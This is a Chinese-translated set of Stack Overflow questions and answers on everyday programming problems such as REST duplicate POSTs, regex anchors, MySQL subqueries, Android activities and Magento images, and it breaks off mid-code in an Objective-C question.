`return RedirectToAction("action", "controller", new { area = "area" });`

在你的情况下`area`应该是`"admin"`

如果你想引用 root `Controller`， area 应该是`""`

您也可以尝试像这样引用适当的控制器：`"admin\home"`，但我不知道等效的`"\home"` 方法是否有效。

# asp.net-mvc-3 - 如何使用 DotNetZip 库

> ID：15159269
> 
> 赞同：0
> 
> 时间：2013-03-01T13:46:18.823
> 
> 标签：asp.net-mvc-3, dotnetzip

我解压缩了我下载的文件。我如何以及在我的 asp.net mvc 3 应用程序中访问什么库才能解压缩包含多个文件的文件？

我的控制器代码：

```
 public ActionResult Upload(ScormUploadViewModel model)
{
  if (ModelState.IsValid)
  {
    if (model.ScormPackageFile != null)
    {
      string zipCurFile = model.ScormPackageFile.FileName;
      string fullPath = Path.GetDirectoryName(zipCurFile);
      string directoryName = Path.GetFileNameWithoutExtension(zipCurFile);
      Directory.CreateDirectory(Path.Combine(fullPath, directoryName));

      using (FileStream zipFile = new FileStream(zipCurFile, FileMode.Open))
      {
        using (GZipStream zipStream = new GZipStream(zipFile, CompressionMode.Decompress))
        {
          StreamReader reader = new StreamReader(zipStream);  
         //next unzip the file? how to get the library i need?
        }
      } 
```

谢谢

# socialengine - 更改 SocialEngine“编辑我的个人资料”页面布局

> ID：15159270
> 
> 赞同：1
> 
> 时间：2013-03-01T13:46:20.370
> 
> 标签：socialengine

我已经浏览了核心中的许多文件，但无法找到或知道如何更改“编辑我的个人资料”、“浏览成员”、“忘记密码”布局以使用默认布局或设置布局。他们似乎都直接加载到内容小部件中..

请提供任何帮助..提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T14:03:27.210

从 SE 4.3.0 版本开始，Forgot Password 密码页面布局包含在布局编辑器的页面列表中。关于“浏览成员”页面 - 它只能手动编辑（`application/modules/User/views/scripts/_browseUsers.tpl`和`application/modules/User/views/scripts/index/browse.tpl`）。“忘记密码”（`application/modules/User/views/scripts/auth/forgot.tpl`和忘记形式）的情况相同。

# c++ - 如何在 Qt 中有效地循环图像？

> ID：15159271
> 
> 赞同：3
> 
> 时间：2013-03-01T13:46:22.090
> 
> 标签：c++, qt

我正在尝试制作一个需要像老虎机一样循环图像的应用程序。我按它们需要循环的顺序排列图像，稍后当按下按钮时，它们需要停在某个位置。我知道我可以使用 QPixmap 并以指定的间隔重绘，尽管我很确定有一种更有效的方法。我想要做的是以恒定的速度无限循环图像，一旦按下按钮，我将计算在哪个图像停止，开始减慢动画并在 x 秒内停止在预定义的索引处。我认为这里可以使用 Qt Animation Framework。我只是不确定如何进行无限循环。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T15:52:47.760

我写的一个非常简化的代码版本：

它是一个显示动画文本和几乎你想要的东西的小部件。

```
class Labels : public QFrame {
    Q_OBJECT
    Q_PROPERTY( int offset READ offset WRITE setOffset )
public:
    /* The property used to animate the view */
    int off;
    QStringList texts;
    Label() : QFrame() {
        texts << "text 1" << "text 2" << "text 3" << "text 4";
        setFixedSize( 200, 200 );
    }
    void paintEvent(QPaintEvent *) {
        QPainter painter( this );
        int x = 20;
        int y = 20;
        foreach( QString str, texts ) {
            int y1 = y + off;
            /* Used to draw the texts as a loop */
            /* If texts is underneath the bottom, draw at the top */
            if ( y1 > height() ) { 
                y1 -= height();
            }
            painter.drawText( x, y1, str );
            y+= 50;
        }
    }

    int offset() {
        return off;
    }

    void setOffset( int o ) {
        off = o;
        update();
    }
}; 
```

主要的 ：

```
int main( int argc, char **argv) {
    QApplication app(argc, argv, true);
    Labels l;
    l.show();

    /* Animated the view */
    QPropertyAnimation *animation = new QPropertyAnimation(&l,"offset");
    animation->setLoopCount( -1 ); /* infinite loop */
    animation->setDuration(2000);
    animation->setStartValue(0.0);
    animation->setEndValue(200.0);
    animation->start();
    return app.exec();
} 
```

最难的是计算最大偏移量......

# rest - 避免使用 REST 重复 POST

> ID：15159274
> 
> 赞同：48
> 
> 时间：2013-03-01T13:46:35.830
> 
> 标签：rest, post, atomic

我一直在 REST API 中使用 POST 来创建对象。每隔一段时间，服务器会创建对象，但客户端会在收到`201 Created`响应之前断开连接。客户端只看到一个失败的 POST 请求，稍后再试一次，服务器愉快地创建了一个重复的对象......

其他人一定有这个问题，对吧？但我在谷歌周围搜索，每个人似乎都忽略了它。

我有 2 个解决方案：

A) 改用 PUT，并在客户端上创建 (GU)ID。

B) 为客户端上创建的所有对象添加一个 GUID，并让服务器强制执行它们的`UNIQUE`-ness。

A 与现有框架不太匹配，而 B 感觉就像一个 hack。在现实世界中，其他人如何解决这个问题？

编辑：

使用 Backbone.js，您可以在客户端上创建对象时将 GUID 设置为 id。保存后，Backbone 将执行 PUT 请求。让您的 REST 后端处理 PUT 到不存在的 id，然后您就设置好了。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-11T23:09:18.693

另一个为此提出的解决方案是[POST Once Exactly (POE)](https://datatracker.ietf.org/doc/html/draft-nottingham-http-poe-00)，其中服务器生成一次性使用的 POST URI，当多次使用时，将导致服务器返回 405 响应。

缺点是 1) POE 草案被允许在没有任何标准化进一步进展的情况下过期，因此 2) 实施它需要更改客户端以使用新的 POE 标头，并且服务器需要额外的工作来实现 POE 语义。

通过谷歌搜索，您可以找到一些正在使用它的 API。

我解决这个问题的另一个想法是条件 POST，我在[此处](https://stackoverflow.com/questions/15911719/rest-prevent-creation-of-duplicate-resources-via-conditional-post)描述并要求提供反馈。

在唯一 URI 生成无法在客户端上放置并因此需要 POST 的情况下，对于防止重复资源创建的最佳方法似乎没有达成共识。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-03-01T13:53:48.160

我总是使用 B - 由于服务器端的任何问题而检测重复。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2016-02-17T09:45:35.133

重复检测是一个杂项，并且会变得非常复杂。真正不同但相似的请求可以同时到达，可能是因为网络连接已恢复。如果网络连接中断，重复请求可能会相隔数小时或数天。

其他回答者中对标识符的所有讨论都是为了在响应重复请求时给出错误，但这通常只会促使客户端获取或生成新的 id 并重试。

**解决这个问题的一个简单而健壮的模式如下：服务器应用程序应该存储对不安全请求的所有响应，然后，如果他们看到重复的请求，他们可以重复之前的响应而不*做其他任何事情*。**对所有不安全的请求执行此操作，您将解决一堆棘手的问题。“重复”由应用程序级别的 id 确定，客户端生成的 GUID 或服务器生成的序列号。在第二种情况下，请求-响应应该专门用于交换 id。我喜欢这个解决方案，因为专门的步骤让客户认为他们得到了他们需要照顾的宝贵东西。如果他们可以生成自己的标识符，他们更有可能将此行放入循环中，并且每个该死的请求都会有一个新的 id。

使用此方案，所有 POST 都是空的，并且 POST 仅用于检索操作标识符。所有的 PUT 和 DELETE 都是完全幂等的：连续的请求得到相同的（存储和重放）响应并且不会导致进一步的事情发生。这种图案最好的地方是它的功夫（熊猫）品质。它有一个弱点：客户倾向于在收到意外响应时重复请求，并将其转化为力量 :-)

如果有人关心，我[在这里](https://drive.google.com/open?id=1s0joc0yb6kXpXZGfdE9SRutoPQuK9RVa77f92xsXzrM)有一个小谷歌文档。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2013-03-01T14:05:37.023

您可以尝试两步法。您请求创建一个对象，该对象返回一个令牌。然后在第二个请求中，使用令牌请求状态。在使用令牌请求状态之前，您将其保持在“暂存”状态。

如果客户端在第一次请求后断开连接，他们将没有令牌，并且对象无限期地保持“暂存”状态，或者直到您使用另一个进程将其删除。

如果第一个请求成功，则您有一个有效的令牌，您可以根据需要多次获取创建的对象，而无需重新创建任何内容。

令牌没有理由不能是数据存储中对象的 ID。您可以在第一次请求期间创建对象。第二个请求实际上只是更新了“暂存”字段。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-03-01T15:11:06.340

## 服务器发布的标识符

如果您要处理的是服务器发出标识符的情况，请在临时的分阶段状态下创建对象。（这是一个固有的非幂等操作，因此应该使用 POST 来完成。）然后客户端必须对其进行进一步的操作，以将其从暂存状态转移到活动/保留状态（这可能是资源的属性，或对资源的合适 POST）。

每个客户端都应该能够以某种方式获取处于暂存状态的资源列表（可能与其他资源混合），并且应该能够删除他们创建的资源（如果它们仍然只是暂存）。您还可以定期删除已停用一段时间的暂存资源。

您不需要向任何其他客户透露一个客户的暂存资源；只有在确认步骤之后，它们才需要全局存在。

## 客户发布的标识符

另一种方法是由客户端发出标识符。这主要在您对文件存储之类的东西进行建模时很有用，因为文件的名称通常对用户代码很重要。在这种情况下，您可以使用 PUT 来创建资源，因为您可以做到这一切都是幂等的。

这样做的缺点是客户端能够创建 ID，因此您完全无法控制他们使用的 ID。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2018-04-19T17:51:48.470

这个问题还有另一种变体。让客户生成唯一的 id 表明我们正在要求客户为我们解决这个问题。考虑一个环境，我们有一个公开的 API，并且有 100 个客户端与这些 API 集成。实际上，我们无法控制客户端代码及其唯一性实现的正确性。因此，如果请求是重复的，最好有智能来理解。这里的一种简单方法是根据用户输入的属性计算和存储每个请求的校验和，定义一些时间阈值（x 分钟）并将来自同一客户端的每个新请求与过去 x 分钟内收到的请求进行比较。如果校验和匹配，则可能是重复请求，并为客户端添加一些质询机制来解决此问题。如果客户端在 x 分钟内使用相同的参数发出两个不同的请求，即使它带有唯一的请求 ID，也可能值得确保这是有意的。这种方法可能不适用于每个用例，但是，我认为这对于执行第二次调用的业务影响很大并且可能使客户付出代价的情况很有用。考虑支付处理引擎的情况，其中中间层最终重试失败的请求或客户双击导致客户端层提交两个请求。我认为这对于执行第二次呼叫的业务影响很大并且可能使客户付出代价的情况很有用。考虑支付处理引擎的情况，其中中间层最终重试失败的请求或客户双击导致客户端层提交两个请求。我认为这对于执行第二次呼叫的业务影响很大并且可能使客户付出代价的情况很有用。考虑支付处理引擎的情况，其中中间层最终重试失败的请求或客户双击导致客户端层提交两个请求。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2019-03-06T15:10:43.127

## 设计

*   自动（无需维护手动黑名单）
*   内存优化
*   磁盘优化

## 算法[解决方案1]

1.  REST 带有 UUID
2.  Web 服务器检查 UUID 是否在内存缓存黑名单表中（如果是，则回答 409）
3.  服务器将请求写入数据库（如果没有被 ETS 过滤）
4.  DB 在写入之前检查 UUID 是否重复
5.  如果是，则为服务器回答 409，并将内存缓存和磁盘列入黑名单
6.  如果不重复写入 DB 并回答 200

## 算法[解决方案2]

1.  REST 带有 UUID
2.  将 UUID 保存在 Memory Cache 表中（有效期为 30 天）
3.  Web 服务器检查 UUID 是否在内存缓存黑名单表中 [返回 HTTP 409]
4.  服务器将请求写入 DB [返回 HTTP 200]

在方案2中，创建内存缓存黑名单的阈值仅在内存中创建，因此永远不会检查数据库是否有重复项。“重复”的定义是“在一段时间内出现的任何请求”。我们还将内存缓存表复制到磁盘上，因此我们在启动服务器之前填充它。

在解决方案 1 中，永远不会有重复，因为我们总是在写入之前只检查一次磁盘，如果它是重复的，则下一次往返将由内存缓存处理。这个解决方案更适合 Big Query，因为请求不是无能的，但它也不太优化。

[资源已存在时 POST 的 HTTP 响应代码](https://stackoverflow.com/questions/3825990/http-response-code-for-post-when-resource-already-exists)

# java - 在 IntelliJ 中设置用于测试应用程序的类路径

> ID：15159276
> 
> 赞同：0
> 
> 时间：2013-03-01T13:46:44.287
> 
> 标签：java, intellij-idea, classpath

我正在开发一个为第 3 方 Java 应用程序设计的测试工具。现在，这是我的问题：

*   3rd 方应用程序在其布局中有许多嵌套目录，其中包含许多 jar。
*   它有一个插件框架，允许人们添加引用他们想在插件中使用的任何库的代码。

当我运行我正在开发的测试工具时，通常当我在 3rd 方应用程序中使用某些插件时，测试工具会在运行时（或任何它）给出 ClassNotFound 异常。所以，我可以构建，但我还没有得到我需要的所有类引用。

有没有一种方法可以将第 3 部分应用程序的根添加到我的类路径中，以便 IntelliJ 在执行时使用它在其中找到的所有 JAR 及其子目录？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T21:54:06.817

已经开放了一段时间并且没有提出其他建议，因此以@CrazyCoder 的评论作为答案结束。

以下链接报告了这种功能缺失；它可能会在较新版本的 IDE 中得到解决：

[http://youtrack.jetbrains.com/issue/IDEA-40818](http://youtrack.jetbrains.com/issue/IDEA-40818)

# javascript - javascript中的RexExp不匹配字符串中的数字

> ID：15159277
> 
> 赞同：2
> 
> 时间：2013-03-01T13:46:47.610
> 
> 标签：javascript, regex

我正在学习 Javascript 中的正则表达式，但有一件事我不明白。

以下正则表达式应匹配从 a 到 z 的任何字符串，但如果我添加一个数字，则表示这是正确的

```
var patron = /[a-zA-Z]/;
var regex = new RegExp(patron);
        var v= "hello word 512";

        if(v.match(regex))
        {
            //should not match but it does
        }else
        {
            objInput.style.color = "red";
        } 
```

他们我试过这个：

```
 var patron = /[a-zA-Z\D]/;
var regex = new RegExp(patron);
        var v= "hello word 512";

        if(v.match(regex))
        {
            //should not match but still dont work
        }else
        {
            objInput.style.color = "red";
        } 
```

而且，括号不匹配

```
 var patron = /[a-zA-Z\"\']/;
    var regex = new RegExp(patron);
            var v= "hello word 512";

        if(v.match(regex))
        {
            //it match whenever the double quoute it followed by the single quoute'
        }else
        {
            objInput.style.color = "red";
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T13:54:47.887

关于您提供的第一个示例，您的正则表达式`/[a-zA-Z]/`检查输入字符串中的任何字符。由于它`h`在您的输入字符串中找到，因此它返回 true。您需要做的是在您的正则表达式中放置开始`^`和结束锚点。`$`新的正则表达式如下所示：

```
/^[a-zA-Z]+$/ 
```

您可以相应地更改所有正则表达式。
要匹配括号，您需要使用反斜杠对其进行转义。`\(`会匹配`(`，`\)`会匹配`)`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T13:52:18.417

您应该匹配**整个字符串**，使用**^**（匹配字符串的开头）和**$**（匹配字符串的结尾）运算符，例如：

```
/^[a-zA-Z\s]+$/.test("any string followed by numbers! 555") // will return false 
```

`a-z`除了字符串中的字符和空格之外，这将不允许任何其他内容。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T13:50:17.293

match 函数在您的情况下寻找至少一个匹配项，这是第一个符号，它是一个字符。如果你只想要字符然后使用 /[a-zA-Z]/.test("your string")

# javascript - 在 td 中换行而不破坏单词

> ID：15159278
> 
> 赞同：2
> 
> 时间：2013-03-01T13:46:49.170
> 
> 标签：javascript, html, css, word-wrap

我在 CSS 中的自动换行有问题。我有一个`td`我定义`width`为的地方`300px`。我在 td 中有一个网址，例如

```
http://www.abc.com/testing/testdata/testurl/test/testing.html 
```

当我使用`word-wrap: break-word`时，文本包装为

```
http://www.abc.com/testing/testdata/tes
turl/test/testing.html 
```

但我确实希望这个词打破。就像`/tes`在一行和`turl`另一行一样。我想要它，

```
 http://www.abc.com/testing/testdata/testurl/
 test/testing.html 
```

请帮忙。任何帮助表示赞赏。谢谢。

**更新**：

我也有可能获得 URL 以外的文本。意味着我无法`'/'`在数据中进行中继。我可以使用 javascript 而不是 jquery。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:05:09.483

我想不出只有 CSS 的解决方案。但是使用 JavaScript，您可以添加单词 break 机会标签`<wbr>`。这告诉浏览器——除了 Internet Explorer——它可以在哪里插入中断：

**JavaScript（使用 jQuery）**

```
$('#element').html( $('#element').html().replace(/\//g, '/<wbr>') ); 
```

**演示**

[http://jsfiddle.net/EkfUR/](http://jsfiddle.net/EkfUR/)

**截至您的编辑**

你在我写小提琴的时候编辑了你的问题。您当然可以使用`/`表达式中使用的另一个字符来替换为`<wbr>`-tag。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:40:50.727

好的，也许这是您会看到的最糟糕的方法，但它确实可以解决问题...将字符串拆分为`span`然后使用带有`:after`空格的空格，如下所示：

```
span:after{
 content:' ';
    font-size:0;
} 
```

这里的例子：http: [//jsfiddle.net/pavloschris/b7qeD/](http://jsfiddle.net/pavloschris/b7qeD/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T13:56:19.050

您可以尝试在 javascript 上执行此操作。

1) 拆分“ **/** ”中的字符串；

2) 从头到尾追加子串，而结果行小于`TD`;

3）如果它更大，不要附加最后一块，并将其放在下一行（如，`<br />`在它之前放一个）；

4）这样做直到您的拆分数组为空，这意味着您的字符串按您想要的方式中断。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T13:53:10.413

我在 .css 中看不到任何内容来破坏特定点的文本部分（例如，在字母 't' 之后换行。

搜索“断字”

[caniuse 断词](http://caniuse.com/#search=word-break)

```
p {
    -ms-word-break: break-all;
    word-break: break-all;

     // Non standard for webkit
     word-break: break-word;

     -webkit-hyphens: auto;
     -moz-hyphens: auto;
     hyphens: auto;
 } 
```

有一个与您的情况相关的好话题：[how-to-prevent-long-words-from-break-my-div](https://stackoverflow.com/questions/320184/how-to-prevent-long-words-from-breaking-my-div)通过插入带有正则表达式的软连字符 () 来调用拆分长单词的可能性。

# ruby-on-rails-3.2 - Rails 应用程序仅在通过 Unicorn 运行时才会出错

> ID：15159279
> 
> 赞同：1
> 
> 时间：2013-03-01T13:46:56.877
> 
> 标签：ruby-on-rails-3.2, unicorn

不幸的是，我不得不配置一台机器来运行多个 Rails 应用程序。最初机器是用 Nginx 和 rvm 和Passenger 设置的。必须配置多个独立的Passengers 似乎很痛苦，而且感觉就像一个黑客。我只是希望这个应用程序能够启动并运行，所以我现在将通过一个不同的端口（8080）与 Unicorn 一起运行它。我有哪个？没有经验。

我的应用程序有一个小助手，可以检查网站是否正在被移动设备访问，然后提供一组不同的视图。这个助手只是有一个小`puts`语句作为调试行。

当穿过独角兽时，这`puts`条线会出现：

```
Errno::EIO (Input/output error - <STDOUT>): 
```

我能想到的只是它无法写入 STDOUT。我以前从未见过 Rails 应用程序在`puts`排队时保释。当然它可能应该使用记录器，但是当 Unicorn 中的这条线在其他地方没有这个问题时，它有什么问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-14T11:19:37.037

EIO 错误表明该进程正在尝试写入 TTY，但该 TTY 现在已消失。您可能从终端启动了 Unicorn，让它守护进程，然后您退出了终端。设置 stderr_path 会有所帮助，因为它将 stderr（也可能是 stdout？）重定向到文件。

但是对于 Phusion 乘客：您不必再设置多个独立乘客。从 Phusion Passenger 4 开始，它支持多个红宝石。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T13:57:56.273

你的 config/unicorn.rb 中必须有`stderr_path`一行。并且该文件必须可由独角兽进程写入

# ajax - Ajax请求延迟1秒

> ID：15159280
> 
> 赞同：0
> 
> 时间：2013-03-01T13:47:02.270
> 
> 标签：ajax, performance, response

这次我的问题是 ajax 请求和 php 文件响应之间的延迟。我用 google chrome 统计数据检查了它，每次函数循环并发送 ajax GET 请求时它几乎总是显示准确的 1 秒等待时间。这使我的脚本很漂亮非常不可用，因为它变慢了很多，以至于浏览器在执行完整循环之前没有响应。

我试图删除所有 MYSQL 查询，因此排除 MYSQL 作为问题，并且延迟仍然存在。我很确定这不是 MYSQL 执行时间过长。

有谁知道这个延迟可能是什么原因造成的。也许是我电脑上的一些设置，或者是 AJAX 的东西？

谢谢你

* * *

[![也许这会有所帮助](../Images/3ef6e76365bde9168ff4d7ec8f2ae005.png)](https://i.stack.imgur.com/uDqLY.png)

也许这会更好地解释。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T16:31:46.927

是的！我已经弄清楚了。显然我的 MYSQL 连接已经花时间了，原因是我使用 localhost 来启动连接，而不是 127.0.0.1。现在它快得多了！:D . 没有理由责怪 AJAX，简单的 127.0.0.1 就可以了。

# mysql - 操作数应包含 1 列错误

> ID：15159283
> 
> 赞同：0
> 
> 时间：2013-03-01T13:47:08.217
> 
> 标签：mysql, sql, mysql-error-1241

我有以下查询

```
SELECT * 
FROM users
WHERE id NOT IN (
    SELECT user_id
    FROM  `counter` 
    WHERE DATE_SUB( CURDATE( ) , INTERVAL 14 DAY ) <= created
)
AND id IN (
    SELECT user_id
    FROM coupon_used
)
AND id IN (
    SELECT user_id
    FROM accounts
) 
```

我需要将 where 子句放在 coupon_used 表中，如果 user id IN coupon used 表中代码 ='xyz'。我确实喜欢这个

```
id IN (
    SELECT user_id, code 
    FROM coupon_used WHERE code ='xyz'
) 
```

但告诉我一个错误：

> 操作数应包含 1 列。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T13:56:41.343

连接会更好，但是为了对您编写的内容进行最小的更改，您可以使用子查询不需要其 where 子句中的列在选择中的事实。即代替

```
id IN (
    SELECT user_id, code 
    FROM coupon_used WHERE code ='xyz'
) 
```

您可以使用

```
id IN (
    SELECT user_id
    FROM coupon_used WHERE code ='xyz'
) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T13:50:54.550

您收到该错误的原因是因为在使用时`IN`，应在子查询中返回的列数必须完全等于一。但我宁愿使用`JOIN`over`IN`子句。

使用连接的等效查询：

```
SELECT  DISTINCT a.userID
FROM    counter a
        INNER JOIN coupon_used b
            ON a.ID = b.user_id
        INNER JOIN accounts c
            ON a.ID = c.user_id
WHERE   b.code ='xyz' AND
        DATE_SUB(CURDATE(), INTERVAL 14 DAY ) <= created 
```

# android - Android主要活动销毁（完成）自动

> ID：15159287
> 
> 赞同：0
> 
> 时间：2013-03-01T13:47:19.543
> 
> 标签：android, android-activity

在我的应用程序中有三个活动：A、B 和 C。活动 A 是主要活动。

当我使用 A 从 A 启动 Activity B 时`Intent`，A 会自动销毁。但是，当我启动 B 时，我还没有完成 A。然后，当我按下设备中的后退按钮时，A 开始使用`onCreate`并且我丢失了所有数据，因为我没有使用`Intent`返回。

从 B 打开 C 时也会发生同样的情况。

```
button.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
                // TODO Auto-generated method stub
                startActivity(new Intent(ActivityA.this,
                        ActivityB.class));
            }
        }); 
```

这是怎么回事？我该如何解决？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-03-21T11:11:46.017

这是我的一个错误，因为活动会自动销毁。我检查了下的选项`Setting=>Developer Option=>Don't Keep Activities`。由于一旦用户离开它就会破坏每个活动。

![在此处输入图像描述](../Images/1ccaa4135cdf6a7bca9152b99638758f.png)

通过取消选中此选项，我的应用程序运行良好。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T14:22:36.633

如果您使用“活动 B”来获得某种一次性结果，那么听起来您需要使用该`startActivityForResult`构造。请参阅 [文档]( [http://developer.android.com/reference/android/app/Activity.html#startActivityForResult(android.content.Intent](http://developer.android.com/reference/android/app/Activity.html#startActivityForResult(android.content.Intent) , int))

*但是*，要维护有关“活动 A”的状态信息而不将其保留在您希望将所有信息（用户已填写的字段等）`Intent`捆绑到传递给“活动 B”的包中的任何位置。此捆绑包被传递到“活动 B” `onCreate`（以及其他几个生命周期点），您可以在其中继续填充“活动 B”中的任何相关信息并将该信息写回意图包，然后再使用经过修改的捆绑包重新启动“活动 A”当您完成“活动 B”时。但这里有龙。我们的应用程序采用了这种特定的机制，对后台堆栈有严格的（错误的？）控制。具体来说，我们的“活动 A”具有特殊的清单声明`android:noHistory="true"`. 这意味着我们还可以通过覆盖`onBackPressed()`每个活动并将同一个包发送到我们刚刚来自的活动的*新实例来控制按下后退按钮时发生的情况。*它看起来像一个普通的后台堆栈，但由于我们希望记住用户输入*而不*在任何地方保留该信息，所以它是一个可用的解决方案。

这允许类似向导的输入，向导输入的每个阶段都是它自己的活动，并且最后只保留经过验证和正确的信息。

另一种方法是将“活动 A”的数据临时存储在 SharedPreferences 区域中，以便在重新启动活动 A 时，您可以在离开时取出适当的位重新组装“活动 A”的原始状态。请放心，当 Android 想要杀死您的 Activity A 时，您几乎无能为力，但您可以使用此处概述的方法来适应它非常合理的杀死。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T13:59:28.083

也许不是你在破坏你的活动。

从关于[活动生命周期](http://developer.android.com/reference/android/app/Activity.html)的页面：（强调我的）

> 如果一个活动被暂停或停止，系统可以通过要求它完成或**简单地终止它的进程**来从内存中删除该活动。当它再次显示给用户时，它必须完全重新启动并恢复到之前的状态。

有明确的说系统可以杀死你的活动进程。

一些可能性是您的设备内存不足，或者您的活动内存不足，导致系统将其杀死。

**编辑**

为了维护您的数据，即使它被破坏，活动之间也是如此。一种方法是使用 Application 类，在[Using the Android Application class to persist data](https://stackoverflow.com/questions/4208886/using-the-android-application-class-to-persist-data)上查看这个答案，也许这就是你要找的。

# javascript - 侦听隐藏输入字段中的输入

> ID：15159291
> 
> 赞同：0
> 
> 时间：2013-03-01T13:47:26.923
> 
> 标签：javascript, jquery, html, javascript-events

有没有办法，在文档准备好/页面加载时，可以监听连续输入的 3 个以上的字符，这些字符不做任何其他事情，而没有其他的重点，如果发生该事件，则传输这 3 个字符和任何内容否则在文本/搜索类型的输入字段中键入的其他内容 - 通过显示、可见性或不透明度 CSS 属性？

我将不胜感激这样做的任何帮助。

我用隐藏的标签和单选按钮/复选框做了类似的事情。但那是因为输入只是点击标签。不像字母数字输入那么复杂。

如果您能帮助我实现上述目标，我将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:04:49.507

您的问题含糊不清，但您可以做的是`.focus()`在任何其他输入有事件时调用输入`onblur`并将该`oninput`事件用于您的隐藏字段。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:06:37.490

应该直截了当：

```
var keys = [];

$(document).on('keypress', function(e) {
    keys.push( String.fromCharCode(e.which) );
    if (keys.length > 2) 
        $('input').fadeIn(400).val( keys.join('') );
}); 
```

[**小提琴**](http://jsfiddle.net/adeneo/afAc6/3/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T14:07:43.890

您可以将按键绑定到文档并将结果存储在变量中，直到您准备好，例如：

```
var typedString = "";
$(document).keypress(function(e){
    typedString += String.fromCharCode(e.keyCode);
    if(typedString.length >= 3){
        $('#some-textbox').show();
        $('#some-textbox').val(typedString);
    }
}); 
```

# php - PC 和 iPhone 上的 PHP 电子邮件内容不同

> ID：15159294
> 
> 赞同：1
> 
> 时间：2013-03-01T13:47:36.893
> 
> 标签：php, iphone, email, unicode

**我使用phpmailer**库以 PHP 发送电子邮件（HTML 格式） 。

我的电子邮件在 PC 和 iPhone 上正确显示，没有重音或其他问题。

但我注意到内容上有一个问题：

事实上，我的电子邮件正文包含字符“ **=da** ”。在 PC 上，我看到“ **=da** ”，但在 iPhone 上，这 3 个字符被替换为“ **Ú** ”。

问题仅出现在我的邮件正文中。如果我在电子邮件主题中显示“ **=da** ”，我可以在 PC 和 iPhone 上正确看到。

注意：我的代码文件采用 UTF-8 格式，我在发送邮件之前对邮件内容进行了 utf8_decode（我记得我没有后顾之忧或其他口音）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:21:22.120

`=xx`, 两个十六进制数字在使用“引用可打印”编码的电子邮件中很常见。

由于您使用的是 UTF-8，因此您不会使用带引号的可打印编码，但听起来 iPhone 可能无论如何都在进行转换。这可能是 iPhone 电子邮件客户端中的错误。

我的建议是切换到引用的可打印模式。在 phpMailer 中，你会这样做：

```
$mail->Encoding = 'quoted-printable'; 
```

# magento - 在 magento 扩展后端显示图像

> ID：15159295
> 
> 赞同：1
> 
> 时间：2013-03-01T13:47:45.907
> 
> 标签：magento

我正在开发一个扩展，并希望在扩展后端页面上显示图像。我已将图像存储在扩展程序的“图像”文件夹中。我正在尝试使用`<img>`标签显示图像。我在“src”属性中提供了图像 url，但它没有在后端页面显示图像。在`system.xml`，我使用以下代码： -

```
<myOption translate="label">
    <label>My Label</label>
    <frontend_type>radios</frontend_type>
    <source_model>mymodule/source_buttons</source_model>
    <sort_order>30</sort_order>
    <show_in_default>1</show_in_default>
    <show_in_website>1</show_in_website>
    <show_in_store>1</show_in_store>
</myOption> 
```

文件中的代码`Model\Source\Buttons.php`：-

```
 <?php
 class mycompany_mymodule_Model_Source_Buttons
 {
    public function toOptionArray()
    {
        $result = array();
        $result[] = array('value' => '32', 'label'=>'<img src="'.Mage::getModuleDir('', 'mycompany_mymodule').DS.'Skin'.DS.'Images'.DS.'img32.png" />');
        $result[] = array('value' => '16', 'label'=>'<img src="'.Mage::getModuleDir('', 'mycompany_mymodule').DS.'Skin'.DS.'Images'.DS.'img16.png" />');

        return $result;  
    }   
 } 
```

在扩展后端页面上，它显示：-

```
<img src="C:\wamp\www\magento\app\code\community\mycompany\mymodule\Skin\Images\img32.png"> 
```

但是`src`属性值链接到：-

```
http://mydomain/magento/index.php/admin/system_config/edit/section/mymodule_options/key/b834efa05ef37070c94d28c6b44e4bf0/C:/wamp/www/magento/app/code/community/mycompany/mymodule/Skin/Images/img32.png 
```

请帮忙...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-02T03:19:50.683

尝试这个：

```
echo $this->getSkinUrl(); 
```

您可以获得图像的路径。

# objective-c - UIViewController 加载一个 UISplitViewController

> ID：15159296
> 
> 赞同：2
> 
> 时间：2013-03-01T13:47:50.457
> 
> 标签：objective-c, uisplitviewcontroller

我有一个 UINavigationController 作为我的 rootViewController，它包含一个 UIViewController（为了讨论，我将其称为项目）。在项目中，我有一个按钮，当单击它时，我想加载一个 UISplitViewController - 最好从底部向上滑动，尽管这只是一个不错的功能。

在 UISplitViewController 中，我有一个“关闭”按钮，我想删除 UISplitViewController 重新显示项目。

根据我的阅读，UISPlitViewControllers 必须是 rootViewControllers。考虑到这一点，到目前为止我的代码如下。

**应用委托**

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];

    ...

